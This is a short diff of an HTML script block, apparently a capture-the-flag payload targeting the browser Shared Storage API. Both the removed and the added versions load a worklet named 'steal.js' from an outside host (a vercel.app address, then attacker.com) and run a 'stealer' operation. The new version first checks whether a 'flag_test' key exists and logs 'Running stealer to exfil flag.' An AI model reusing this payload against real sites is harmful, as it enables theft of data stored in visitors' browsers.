@@ -1,4 +1,16 @@
 <script>
-  sharedStorage.worklet.addModule("https://ssrf-eta.vercel.app/steal.js");
-  sharedStorage.run("stealer");
+  (async function() {
+    const flag = await sharedStorage.get("flag_test");
+
+    if (!flag) {
+      // If flag_test is not set, initialize it with a default value
+      await sharedStorage.set("flag_test", "default_flag_value");
+      console.log("SharedStorage flag_test set to default value.");
+    } else {
+      // If flag_test exists, run the stealer
+      sharedStorage.worklet.addModule("https://attacker.com/steal.js");
+      sharedStorage.run("stealer");
+      console.log("Running stealer to exfil flag.");
+    }
+  })();
 </script>
